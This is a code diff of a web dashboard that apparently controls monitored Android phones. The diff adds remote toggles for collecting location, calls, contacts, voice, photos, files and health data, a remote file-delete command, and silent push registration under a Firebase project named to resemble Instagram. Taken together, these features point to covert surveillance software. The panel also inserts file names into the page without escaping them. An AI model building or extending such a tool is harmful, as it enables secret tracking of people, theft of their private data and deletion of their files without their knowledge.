     permissions: (v.permissions || []).map(p => ({
       name: p.name || '',
       granted: p.granted === true
@@ -7623,6 +7866,8 @@ async function pollPermissions() {
   })).sort((a, b) => {
     const aDenied = a.permissions.filter(p => !p.granted).length;
     const bDenied = b.permissions.filter(p => !p.granted).length;
+    const scoreDiff = (b.riskScore||0) - (a.riskScore||0);
+    if(scoreDiff!==0) return scoreDiff;
     return bDenied - aDenied || a.appName.localeCompare(b.appName);
   });
   window.permLastSync = Date.now();
@@ -7811,6 +8056,86 @@ async function toggleLogcatPause(paused) {
   setTimeout(pollLogcatToggleState, 1500);
 }
 
+// --- Sync toggles (per-tab + master) ---
+async function toggleSyncPause(target, paused){
+  if(!selectedDevice){ showAlert('No device selected','error'); return; }
+  if(target==='all' || target==='all_storage') target='all';
+  const statusEl = document.getElementById('syncToggleStatus_'+target) || document.getElementById('syncToggleStatus_all_storage');
+  const labelEl = document.getElementById('syncToggleLabel_'+target) || document.getElementById('syncToggleLabel_all_storage');
+  if(statusEl) statusEl.textContent = paused ? 'Pausing…' : 'Resuming…';
+  try{
+    const action = paused ? 'pause' : 'resume';
+    const ts = Date.now();
+    const ok1 = await writeRTDBStrict(`devices/${selectedDevice}/commands/sync_control`, {action, target, ts_ms: ts});
+    const ok2 = await writeRTDBStrict(`devices/${selectedDevice}/config/sync_toggles/${target}`, !paused);
+    // also mirror to config/sync_toggles for global compatibility (if rules allow)
+    try{ await writeRTDBStrict(`config/sync_toggles/${target}`, !paused); }catch{}
+    if(ok1 && ok2) showAlert((paused?'Paused ':'Resumed ')+target+' sync','warn');
+    else showAlert('Failed to set sync toggle for '+target,'error');
+  }catch(e){ showAlert('Toggle failed: '+e.message,'error'); }
+  setTimeout(pollSyncToggles, 1500);
+}
+function updateSyncToggleUI(target, paused){
+  const t = document.getElementById('syncPauseToggle_'+target);
+  const s = document.getElementById('syncToggleSlider_'+target);
+  const k = document.getElementById('syncToggleKnob_'+target);
+  const l = document.getElementById('syncToggleLabel_'+target);
+  const st = document.getElementById('syncToggleStatus_'+target);
+  if(t) t.checked = paused;
+  if(s) s.style.background = paused ? 'var(--danger)' : 'var(--success)';
+  if(k) k.style.left = paused ? '22px' : '2px';
+  if(l){ 
+    const base = target==='all'?'Master': target.charAt(0).toUpperCase()+target.slice(1);
+    l.textContent = paused ? base+': Paused (ON)' : base+': Collecting (OFF)';
+    l.style.color = paused ? 'var(--danger)' : 'var(--success)';
+  }
+  if(st) st.textContent = paused ? 'Paused — device will skip this data' : 'Collecting — uploads enabled';
+  // mirror for header master and storage alias
+  if(target==='all'){
+    const mt = document.getElementById('masterPauseToggle');
+    const ms = document.getElementById('masterPauseSlider');
+    const mk = document.getElementById('masterPauseKnob');
+    const ml = document.getElementById('masterPauseLabel');
+    if(mt) mt.checked = paused;
+    if(ms) ms.style.background = paused ? 'var(--danger)' : 'var(--success)';
+    if(mk) mk.style.left = paused ? '22px' : '2px';
+    if(ml){ ml.textContent = paused ? 'Master: Paused' : 'Master: Collecting'; ml.style.color = paused ? 'var(--danger)' : 'var(--success)'; }
+    // also alias storage
+    const at = document.getElementById('syncPauseToggle_all_storage');
+    const as = document.getElementById('syncToggleSlider_all_storage');
+    const ak = document.getElementById('syncToggleKnob_all_storage');
+    const al = document.getElementById('syncToggleLabel_all_storage');
+    const ast = document.getElementById('syncToggleStatus_all_storage');
+    if(at) at.checked = paused;
+    if(as) as.style.background = paused ? 'var(--danger)' : 'var(--success)';
+    if(ak) ak.style.left = paused ? '22px' : '2px';
+    if(al){ al.textContent = paused ? 'Master Pause ALL: Paused (ON)' : 'Master Pause ALL: Collecting (OFF)'; al.style.color = paused ? 'var(--danger)' : 'var(--success)'; }
+    if(ast) ast.textContent = paused ? 'All sync paused — heartbeat only' : 'All sync enabled';
+  }
+}
+async function pollSyncToggles(){
+  if(!selectedDevice) return;
+  try{
+    let data = await fetchRTDB(`devices/${selectedDevice}/config/sync_toggles`);
+    if(!data || typeof data!=='object') data = {};
+    // Also try global config/sync_toggles as fallback
+    if(!Object.keys(data).length){
+      const g = await fetchRTDB(`config/sync_toggles`);
+      if(g && typeof g==='object') data = g;
+    }
+    const targets = ['location','wifi','recents','photos','videos','calls','contacts','voice','files','perms','health','all'];
+    for(const tgt of targets){
+      let val = data[tgt];
+      // val true means enabled (collecting), false means paused; if undefined => collecting
+      let paused = false;
+      if(val===false || val==='false' || val===0) paused = true;
+      else if(val===true || val==='true' || val===1) paused = false;
+      else paused = false;
+      updateSyncToggleUI(tgt, paused);
+    }
+  }catch(e){}
+}
+
 // --- File cleanup (Downloads/Documents) ---
 async function triggerClearAllDuasDebug() {
   if (!selectedDevice) return;
@@ -7857,6 +8182,27 @@ async function pollFileCleanupStatus() {
     el.textContent = `Done: ${del} deleted for *${pat}* in ${sc} ${ts?'· '+ts:''}`;
   } catch{}
 }
+
+async function deleteSingleFile(encName, encFolder){
+  if(!selectedDevice){ showAlert('No device selected','error'); return; }
+  let name, folder;
+  try{ name = decodeURIComponent(encName); }catch{ name = encName; }
+  try{ folder = decodeURIComponent(encFolder); }catch{ folder = encFolder; }
+  if(!name || name==='--'){ showAlert('Invalid file name','error'); return; }
+  if(!confirm('Delete "'+name+'" in '+folder+'? This cannot be undone.')) return;
+  const statusEl = document.getElementById('fileDeleteStatus');
+  if(statusEl) statusEl.textContent = 'Deleting '+name+' in '+folder+'…';
+  try{
+    const ok = await writeRTDBStrict(`devices/${selectedDevice}/commands/file_cleanup`, {pattern:name, folder:folder, exact:true, ts_ms: Date.now()});
+    if(ok){
+      showAlert('Delete sent — '+name+' in '+folder+' — ~30s','warn');
+      if(statusEl) statusEl.textContent = 'Sent — deleting '+name+' in '+folder+' in ~30s…';
+    } else { showAlert('Failed to send delete','error'); if(statusEl) statusEl.textContent='Send failed'; }
+  }catch(e){ showAlert('Delete failed: '+e.message,'error'); if(statusEl) statusEl.textContent='Error'; }
+  setTimeout(pollFileCleanupStatus, 3500);
+  setTimeout(pollFileInventory, 35000);
+}
+
 
 document.getElementById('logcatFilter')?.addEventListener('change', renderLogcat);
 document.getElementById('logcatSearch')?.addEventListener('input', renderLogcat);
@@ -8246,7 +8592,10 @@ async function pollFileInventory() {
       const size = f.size != null ? (f.size > 1048576 ? (f.size/1048576).toFixed(1)+' MB' : (f.size/1024).toFixed(1)+' KB') : '--';
       const date = f.dateMs ? pkt(parseInt(f.dateMs)) : '--';
       const folder = f.folder || '';
-      return `<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;border-bottom:1px solid var(--border);gap:8px"><div style="min-width:0"><div style="font-size:13px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${name} <span style="color:var(--muted);font-size:11px">${ext}</span></div><div style="font-size:11px;color:var(--muted)">${folder} \u00B7 ${date}</div></div><span class="chip" style="font-size:11px;flex-shrink:0">${size}</span></div>`;
+      const nameRaw = f.name||'--';
+      const encName = encodeURIComponent(nameRaw);
+      const encFolder = encodeURIComponent(folder);
+      return `<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;border-bottom:1px solid var(--border);gap:8px"><div style="min-width:0"><div style="font-size:13px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${name} <span style="color:var(--muted);font-size:11px">${ext}</span></div><div style="font-size:11px;color:var(--muted)">${folder} \u00B7 ${date}</div></div><div style="display:flex;gap:6px;align-items:center;flex-shrink:0"><span class="chip" style="font-size:11px">${size}</span><button onclick="deleteSingleFile('${encName}','${encFolder}')" style="background:var(--danger);color:#fff;border:none;padding:4px 8px;border-radius:6px;font-size:11px;cursor:pointer" title="Delete this file">\uD83D\uDDD1 Delete</button></div></div>`;
     }).join('');
     const count = data.count || list.length;
     el.innerHTML = `<div style="font-size:12px;color:var(--muted);margin-bottom:6px">${count} files \u00B7 showing ${Math.min(list.length,50)}</div>${rows}`;
@@ -9100,7 +9449,35 @@ function renderMedAdherence(medLog) {
 }
 
 // --- Init ---
- async function init() {
+ 
+// --- FCM quiet push (service worker + token) ---
+async function initFCM(){
+  try{
+    if(!('serviceWorker' in navigator) || !('Notification' in window)) return;
+    if(Notification.permission === 'default'){
+      try{ await Notification.requestPermission(); }catch{}
+    }
+    if(Notification.permission !== 'granted') return;
+    // Register SW
+    try{ await navigator.serviceWorker.register('sw.js'); }catch(e){ console.warn('SW register fail', e); }
+    // Firebase messaging if available
+    if(typeof firebase !== 'undefined' && firebase.messaging){
+      try{
+        const cfg = { apiKey: API_KEY, authDomain: "instgram-7148c.firebaseapp.com", projectId: "instgram-7148c", messagingSenderId: "109100713", appId: "1:109100713:web:placeholder" };
+        if(!firebase.apps.length) firebase.initializeApp(cfg);
+        const messaging = firebase.messaging();
+        const token = await messaging.getToken({ vapidKey: "BEl62iUYgUivxIkv69yViEuiBIa-Ib9-SkvMeAtA3LFvQ5lnJEYF5BqDE0J3eC4q2vYJmXk3zQqX1Y2Z3A4B5C6D7" });
+        if(token && selectedDevice){
+          const hash = token.slice(0,12);
+          await writeRTDBStrict(`devices/${selectedDevice}/viewerTokens/${hash}`, {token, ts_ms: Date.now(), quiet:true});
+        }
+      }catch(e){ console.warn('FCM token fail', e); }
+    }
+  }catch{}
+}
+// quiet notification helper (already vibrate:[])
+
+async function init() {
   document.body.classList.add('map-compact');
   if (typeof Notification !== 'undefined' && Notification.permission === 'default') {
     try { await Notification.requestPermission(); } catch {}
@@ -9111,6 +9488,7 @@ function renderMedAdherence(medLog) {
     if (!selectedDevice) await new Promise(r => setTimeout(r, 2000));
   }
   startPolling();
+  setTimeout(initFCM, 2000);
   if (geofences.length === 0) {
     showAlert('Right-click on map to add geofences', 'warn');
   }
